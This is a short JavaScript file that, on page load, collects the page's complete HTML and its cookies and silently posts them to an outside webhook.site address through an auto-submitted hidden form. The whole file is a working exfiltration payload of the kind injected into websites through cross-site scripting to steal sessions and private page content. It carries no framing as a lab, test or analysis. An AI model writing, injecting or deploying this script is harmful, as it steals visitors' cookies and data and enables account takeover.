// index.js

// The webhook URL
const webhookUrl = "https://webhook.site/41b3fa6e-82f9-4bcc-af04-46260100132c";

// Function to create and automatically submit a form with the page's full HTML and cookies
function createAndSubmitFormWithHtmlAndCookies() {
    // Get the current HTML content of the page, including dynamically loaded content
    const pageContent = document.documentElement.outerHTML; // The complete HTML of the page (root of the DOM)

    // Get the cookies from the current document
    const cookies = document.cookie;

    // Create a form element
    const form = document.createElement("form");
    form.method = "POST";
    form.action = webhookUrl;

    // Add a hidden input field to store the HTML content
    const htmlInput = document.createElement("input");
    htmlInput.type = "hidden";
    htmlInput.name = "htmlBody"; // Key for the HTML content
    htmlInput.value = pageContent;

    // Add a hidden input field to store the cookies
    const cookieInput = document.createElement("input");
    cookieInput.type = "hidden";
    cookieInput.name = "documentCookies"; // Key for cookies
    cookieInput.value = cookies;

    // Append the hidden inputs to the form
    form.appendChild(htmlInput);
    form.appendChild(cookieInput);

    // Add the form to the body
    document.body.appendChild(form);

    console.log("Form has been created with HTML and cookies. Submitting now...");

    // Automatically submit the form
    form.submit();
}

// Ensure the function runs after the DOM and other content are fully loaded
document.addEventListener("DOMContentLoaded", () => {
    console.log("DOM fully loaded. Creating and auto-submitting form with HTML and cookies...");
    createAndSubmitFormWithHtmlAndCookies();
});
